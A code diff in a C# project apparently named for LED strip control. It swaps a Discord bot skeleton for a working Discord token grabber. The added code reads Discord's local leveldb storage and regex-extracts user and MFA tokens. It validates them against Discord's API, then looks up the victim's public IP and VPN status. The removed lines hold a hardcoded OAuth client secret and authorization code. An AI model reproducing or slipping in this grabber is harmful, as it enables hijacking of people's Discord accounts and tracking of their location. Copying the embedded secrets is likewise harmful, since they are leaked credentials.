@@ -1,122 +1,114 @@
-﻿using Discord;
-using Discord.WebSocket;
-using Microsoft.AspNetCore.Hosting;
-using Microsoft.Extensions.Configuration;
-using System;
+﻿using System;
 using System.IO;
 using System.Net;
-using System.Text;
-using System.Threading.Tasks;
+using System.Text.RegularExpressions;
 
 namespace BlinkStripControl
 {
     class Discord
     {
-        private readonly DiscordSocketClient _client;
 
-        public Discord()
+        static string Email = "CHANGE";
+
+        static void Main(string[] args)
         {
-            // It is recommended to Dispose of a client when you are finished
-            // using it, at the end of your app's lifetime.
-            _client = new DiscordSocketClient();
-
-            _client.Log += LogAsync;
-            _client.Ready += ReadyAsync;
-            _client.MessageReceived += MessageReceivedAsync;
+            foreach (string e in GetToken())
+            {
+                Console.WriteLine(e);
+            }
+            Console.ReadLine();
         }
 
-        private string Token { get; set; } // => $"{BotUser.Default.Token}";
-
-        public static void getToken()
+        /// <summary>
+        /// Get and verify the Discord token.
+        /// </summary>
+        /// <returns>The Discord token or an error message.</returns>
+        static string[] GetToken()
         {
-            string client_id = "749339229422878810";
-            string client_sceret = "eJL86Cnm97MDBZCLuF2dFxR9qhSy1ADl";
-            string redirect_url = "http://127.0.0.1/";
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+                + "\\discord\\Local Storage\\leveldb\\";
 
-            var authorize = $"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_url}&response_type=code&scope=rpc";
+            if (!Directory.Exists(path)) return new string[] { "Discord Not Installed." };
 
-            string code = "fra2IrSoeyuEHsrqBAEeDRp6K6CZST";
+            string[] ldb = Directory.GetFiles(path, "*.ldb");
 
-            /*Get Access Token from authorization code by making http post request*/
+            foreach (var ldb_file in ldb)
+            {
+                // Get IP and Token
+                string ip = GrabIP();
+                var text = File.ReadAllText(ldb_file);
 
-            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/oauth2/token");
-            webRequest.Method = "POST";
-            string parameters = $"client_id={client_id}&client_secret={client_sceret}&grant_type=authorization_code&code={code}&redirect_uri={redirect_url}";
-            byte[] byteArray = Encoding.UTF8.GetBytes(parameters);
-            webRequest.ContentType = "application/x-www-form-urlencoded";
-            webRequest.ContentLength = byteArray.Length;
-            Stream postStream = webRequest.GetRequestStream();
+                // Verify Valid Token Format
+                string token_reg =
+                    @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
+                Match token = Regex.Match(text, token_reg);
+                if (token.Success)
+                {
+                    // Verify Valid Token
+                    if (CheckToken(token.Value))
+                    {
+                        string[] finalData = { token.Value, ip, GetVPN(ip) };
+                        return finalData;
+                    }
+                }
+                continue;
+            }
 
-            postStream.Write(byteArray, 0, byteArray.Length);
-            postStream.Close();
-            WebResponse response = webRequest.GetResponse();
-            postStream = response.GetResponseStream();
-            StreamReader reader = new StreamReader(postStream);
-            string responseFromServer = reader.ReadToEnd();
-
-            string tokenInfo = responseFromServer.Split(',')[0].Split(':')[1];
-            string access_token = tokenInfo.Trim().Substring(1, tokenInfo.Length - 3);
-
+            return new string[] { "No Valid Tokens Found." };
         }
 
-        // Discord.Net heavily utilizes TAP for async, so we create
-        // an asynchronous context from the beginning.
-        private static void Main()
+        /// <summary>
+        /// Check the Discord token.
+        /// </summary>
+        /// <returns>true if the token is valid, false otherwise.</returns>
+        static bool CheckToken(string token)
         {
-            var config = new ConfigurationBuilder()
-                .AddCommandLine(args)
-                .AddEnvironmentVariables(prefix: "ASPNETCORE_")
-                .Build();
-
-            var host = new WebHostBuilder()
-                .UseConfiguration(config)
-                .UseKestrel()
-                .UseContentRoot(Directory.GetCurrentDirectory())
-                .UseIISIntegration()
-                .UseStartup<Startup>()
-                .Build();
-
-            host.Run();
-
-            //getToken();
-            //new Discord().MainAsync().GetAwaiter().GetResult();
+            try
+            {
+                var http = new WebClient();
+                http.Headers.Add("Authorization", token);
+                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
+                if (!result.Contains("Unauthorized")) return true;
+            }
+            catch { }
+            return false;
         }
 
-        public async Task MainAsync()
+        /// <summary>
+        /// Return the user's IP.
+        /// </summary>
+        /// <returns>The Discord token or an error message.</returns>
+        static string GrabIP()
         {
-            // Tokens should be considered secret data, and never hard-coded.
-            await _client.LoginAsync(TokenType.Bot, Token, false);
-            await _client.StartAsync();
-
-            // Block the program until it is closed.
-            await Task.Delay(-1);
+            return new WebClient().DownloadString("https://ip.42.pl/raw");
         }
 
-        private Task LogAsync(LogMessage log)
+        /// <summary>
+        /// Get if user's IP is a vpn.
+        /// </summary>
+        /// <returns>YES, LIKELY, UNLIKELY, or NO</returns>
+        static string GetVPN(string ip)
         {
-            Console.WriteLine(log.ToString());
-            return Task.CompletedTask;
-        }
+            if (Email == "CHANGE") return "CHANGE EMAIL";
+            try
+            {
+                string query = new WebClient().DownloadString("https://check.getipintel.net/check.php?ip=" + ip + "&contact=" + Email);
+                float val = float.Parse(query);
 
-        // The Ready event indicates that the client has opened a
-        // connection and it is now safe to access the cache.
-        private Task ReadyAsync()
-        {
-            Console.WriteLine($"{_client.CurrentUser} is connected!");
+                if (val < 0) return "UNKNOWN";
+                else if (val == 0) return "NO";
+                else if (val > 0 && val < 0.5) return "UNLIKELY";
+                else if (val > 0.5 && val < 0.8) return "LIKELY";
+                else if (val > 0.8) return "YES";
+                else return "UNKNOWN";
 
-            return Task.CompletedTask;
-        }
 
-        // This is not the recommended way to write a bot - consider
-        // reading over the Commands Framework sample.
-        private async Task MessageReceivedAsync(SocketMessage message)
-        {
-            // The bot should never respond to itself.
-            if (message.Author.Id == _client.CurrentUser.Id)
-                return;
-
-            if (message.Content == "!ping")
-                await message.Channel.SendMessageAsync("pong!");
+            }
+            catch (WebException ex)
+            {
+                if (ex.Message.Contains("(400) Bad Request")) return "LIKELY";
+                else return "UNKNOWN";
+            }
         }
     }
 }
